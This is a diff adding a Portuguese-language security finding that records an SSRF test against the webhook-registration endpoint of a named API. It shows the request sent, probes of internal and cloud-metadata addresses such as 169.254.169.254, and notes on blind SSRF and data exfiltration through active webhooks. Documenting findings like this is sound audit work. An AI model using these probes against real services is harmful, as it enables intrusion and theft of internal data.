@@ -1,0 +1,35 @@
+# F-008 SSRF via POST /webhooks — Teste de Conexão
+Alvo: api.promisse.com.br (Railway.app)
+Severidade: Alta
+Timestamp: 2026-08-20T16:20:00Z
+
+## Descrição
+O endpoint `POST /webhooks` permite cadastrar URLs para receber eventos. 
+O sistema faz uma requisição POST de teste para verificar se a URL está ativa.
+Isso configura um vetor de SSRF (Server-Side Request Forgery).
+
+## Detalhes da Requisição
+```
+POST /webhooks HTTP/2
+Host: api.promisse.com.br
+Authorization: sk_live_<key>
+Content-Type: application/json
+
+{"url":"https://requestcatcher.com/test","events":["payment.approved"]}
+```
+
+## Resultado do Teste
+- URLs externas (requestcatcher, hookb.in) → WEBHOOK_TEST_FAILED
+- URLs internas (localhost, 127.0.0.1, 169.254.169.254) → WEBHOOK_TEST_FAILED
+- URL httpbin.org → Webhook CRIADO com sucesso (active: true)
+
+## Observações
+1. O sistema valida a URL com uma requisição POST (espera 200/201/202)
+2. Falha no teste NÃO impede criação do webhook (webhook criado mesmo com falha)
+3. Railway blocks accesso a portas não-padrão ou ranges internos
+4. Possível SSRF cego com resposta diferente para URLs internas vs externas
+5. Webhook ativo pode ser usado para exfiltração de dados via eventos
+
+## Webhooks Criados (para referência)
+- httpbin.org/post → webhook ativo com secret whsec_*
+- active: true (webhooks funcionais)
